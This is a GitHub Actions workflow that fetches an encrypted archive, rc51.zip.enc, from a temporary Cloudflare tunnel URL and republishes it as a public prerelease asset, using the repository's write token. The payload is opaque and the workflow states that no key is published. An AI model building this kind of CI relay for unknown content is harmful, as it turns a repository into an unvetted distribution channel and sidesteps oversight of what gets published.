name: Temporary RC51 encrypted bridge

on:
  pull_request:
    branches: [main]
    paths:
      - ".github/workflows/_tmp_rc51_public_bridge.yml"
  workflow_dispatch:

permissions:
  contents: write

jobs:
  bridge:
    runs-on: ubuntu-latest
    steps:
      - name: Download encrypted RC51 payload
        shell: bash
        run: |
          set -euo pipefail
          curl -fsSL --retry 8 --retry-delay 2 'https://fluid-respondents-rose-dance.trycloudflare.com/rc51.zip.enc' -o rc51.zip.enc
          echo '96dd502170909ce7408be35cf41350e8b94890d26694bacc4c58a1886531b537  rc51.zip.enc' | sha256sum -c -
      - name: Upload encrypted RC51 artifact
        uses: actions/upload-artifact@v4
        with:
          name: rc51-encrypted-relay
          path: rc51.zip.enc
          compression-level: 0
          retention-days: 1
      - name: Publish temporary encrypted release asset
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          gh release delete tmp-rc51-bridge --yes --cleanup-tag 2>/dev/null || true
          gh release create tmp-rc51-bridge rc51.zip.enc --title 'Temporary RC51 bridge' --notes 'Encrypted transfer payload only. No key published.' --prerelease
